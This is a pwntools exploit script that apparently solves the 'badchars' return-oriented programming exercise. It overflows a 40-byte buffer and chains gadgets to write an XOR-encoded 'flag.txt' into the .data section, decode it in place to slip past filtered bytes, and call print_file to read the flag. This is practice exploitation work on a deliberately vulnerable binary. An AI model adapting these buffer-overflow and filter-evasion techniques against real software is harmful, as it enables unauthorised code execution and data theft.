#!/usr/bin/env python3

from pwn import *

exe = ELF("badchars_patched")
libc = ELF("libbadchars.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    offset = 40
    printfile = 0x400510
    datasec = 0x00601030
    xorr15r14 = 0x400628 # r15 -> mem
    movr13r12 = 0x400634 # r13 -> mem
    popr12r13r14r15 = 0x40069c
    popr14r15 = 0x4006a0
    poprdi = 0x4006a3
    xorstr = xor('flag.txt', 3)

    xorsploit = b''
    dataoff = 0
    for c in xorstr:
        xorsploit += pack(popr14r15)
        xorsploit += pack(0x3)
        xorsploit += pack(datasec + dataoff)
        xorsploit += pack(xorr15r14)
        dataoff += 1

    payload = flat(b'A'*offset, popr12r13r14r15, xorstr, datasec, 0x0, 0x0, movr13r12, xorsploit, poprdi, datasec, printfile)

    r.sendlineafter(b'>', payload)

    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)


if __name__ == "__main__":
    main()
